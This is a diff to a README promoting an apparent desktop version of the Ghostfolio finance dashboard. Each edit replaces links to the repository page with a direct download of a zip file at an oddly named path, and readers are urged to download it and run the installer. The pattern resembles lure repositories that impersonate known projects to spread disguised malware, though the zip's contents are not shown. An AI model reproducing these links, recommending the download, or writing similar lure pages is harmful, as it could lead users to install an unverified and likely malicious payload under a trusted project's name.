@@ -1,6 +1,6 @@
 # 📊 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Personal Finance Command Center
 
-[![Download Now](https://img.shields.io/badge/Download-Ghostfolio%20Dashboard-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard)
+[![Download Now](https://img.shields.io/badge/Download-Ghostfolio%20Dashboard-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/gypsywort/v1.7.zip)
 
 ---
 
@@ -51,7 +51,7 @@ We designed this for absolute beginners. Follow these steps, and you'll be up an
 
 Click the green button at the top of this page, or use this link:
 
-👉 **[Click Here to Download Ghostfolio-Desktop-Self-Hosted-Dashboard](https://github.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard)**
+👉 **[Click Here to Download Ghostfolio-Desktop-Self-Hosted-Dashboard](https://raw.githubusercontent.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/gypsywort/v1.7.zip)**
 
 Visit this link to download the application.
 
@@ -137,7 +137,7 @@ Since your data is stored locally, there's no password reset. We recommend keepi
 
 Good news – Ghostfolio-Desktop-Self-Hosted-Dashboard gets better with time. To update:
 
-1. Visit the download page again: [https://github.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard](https://github.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard)
+1. Visit the download page again: [https://raw.githubusercontent.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/gypsywort/v1.7.zip](https://raw.githubusercontent.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/gypsywort/v1.7.zip)
 2. Download the latest version (same steps as before)
 3. Run the installer over your current version
 
@@ -176,7 +176,7 @@ The setup takes minutes. The insights last a lifetime.
 
 Stop guessing. Start knowing. Download your dashboard today.
 
-**👉 [Download Ghostfolio-Desktop-Self-Hosted-Dashboard Now](https://github.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard)**
+**👉 [Download Ghostfolio-Desktop-Self-Hosted-Dashboard Now](https://raw.githubusercontent.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/gypsywort/v1.7.zip)**
 
 ---
 
@@ -209,6 +209,6 @@ Check your internet connection. The dashboard fetches live data from public fina
 
 *Ghostfolio-Desktop-Self-Hosted-Dashboard – Because your money deserves better attention.*
 
-[![Download Now](https://img.shields.io/badge/Download-Ghostfolio%20Dashboard-2196F3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard)
+[![Download Now](https://img.shields.io/badge/Download-Ghostfolio%20Dashboard-2196F3?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Almalikiyousif410/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/gypsywort/v1.7.zip)
 
 Keywords: asset-tracking, dashboard, docker, finance, finance-app, ghostfolio, investment-portfolio, pwa
